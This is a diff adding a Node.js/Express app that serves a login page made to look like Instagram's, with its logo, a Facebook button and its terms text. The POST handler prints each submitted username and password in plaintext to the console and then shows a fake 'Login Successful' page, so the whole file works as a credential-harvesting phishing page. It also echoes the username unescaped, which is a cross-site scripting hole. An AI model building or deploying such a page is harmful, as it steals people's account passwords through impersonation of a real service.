@@ -1,0 +1,161 @@
+// Create a single file `app.js` and run it with Node.js
+
+// Required Modules
+const express = require('express');
+const bodyParser = require('body-parser');
+const bcrypt = require('bcrypt');
+const app = express();
+
+// Middleware
+app.use(bodyParser.urlencoded({ extended: true }));
+
+// Serve the login page
+app.get('/', (req, res) => {
+    res.send(`
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Login</title>
+            <style>
+                body {
+                    font-family: Arial, sans-serif;
+                    background-color: #fafafa;
+                    margin: 0;
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    height: 100vh;
+                }
+                .container {
+                    width: 100%;
+                    max-width: 350px;
+                    text-align: center;
+                }
+                .container img {
+                    margin-top: 20px;
+                    width: 175px;
+                }
+                .login-box {
+                    background-color: white;
+                    border: 1px solid #dbdbdb;
+                    padding: 20px;
+                    margin-top: 20px;
+                    border-radius: 10px;
+                }
+                .login-box input[type="text"], .login-box input[type="password"] {
+                    width: 100%;
+                    padding: 10px;
+                    margin: 5px 0;
+                    border: 1px solid #dbdbdb;
+                    border-radius: 5px;
+                    font-size: 14px;
+                }
+                .login-box button {
+                    width: 100%;
+                    padding: 10px;
+                    background-color: #3897f0;
+                    border: none;
+                    color: white;
+                    font-weight: bold;
+                    font-size: 14px;
+                    margin-top: 10px;
+                    border-radius: 5px;
+                    cursor: pointer;
+                }
+                .login-box button:hover {
+                    background-color: #2878c0;
+                }
+                .forgot-password {
+                    margin-top: 15px;
+                    color: #00376b;
+                    font-size: 12px;
+                }
+                .signup-box {
+                    margin-top: 20px;
+                    font-size: 14px;
+                }
+                .signup-box a {
+                    color: #3897f0;
+                    text-decoration: none;
+                }
+                .terms {
+                    margin-top: 15px;
+                    font-size: 12px;
+                    color: #8e8e8e;
+                }
+                .continue-facebook {
+                    margin: 10px 0;
+                    padding: 10px;
+                    border: none;
+                    color: white;
+                    background-color: #4267b2;
+                    width: 100%;
+                    border-radius: 5px;
+                    font-size: 14px;
+                    font-weight: bold;
+                }
+            </style>
+        </head>
+        <body>
+
+            <div class="container">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram logo">
+                
+                <div class="login-box">
+                    <button class="continue-facebook">Continue with Facebook</button>
+
+                    <div class="or-divider">
+                        <hr>
+                        <span>OR</span>
+                        <hr>
+                    </div>
+
+                    <form action="/login" method="POST">
+                        <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                        <input type="password" name="password" placeholder="Password" required>
+                        <button type="submit">Log In</button>
+                    </form>
+
+                    <div class="forgot-password">
+                        <a href="#">Forgot password?</a>
+                    </div>
+                </div>
+
+                <div class="signup-box">
+                    Don't have an account? <a href="#">Sign up</a>
+                </div>
+
+                <div class="terms">
+                    By continuing, you agree to Instagram's <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.
+                </div>
+            </div>
+
+        </body>
+        </html>
+    `);
+});
+
+// Handle login form submission
+app.post('/login', (req, res) => {
+    const { username, password } = req.body;
+
+    // Log the entered username and password (for testing)
+    console.log(`Username: ${username}, Password: ${password}`);
+
+    // Normally, you'd hash the password here and check it against a database
+    // For simplicity, we're skipping the database part
+
+    // Send a response back to the client
+    res.send(`
+        <h1>Login Successful</h1>
+        <p>Welcome, ${username}!</p>
+        <a href="/">Go back to login</a>
+    `);
+});
+
+// Start the server
+app.listen(3000, () => {
+    console.log('Server is running on http://localhost:3000');
+});
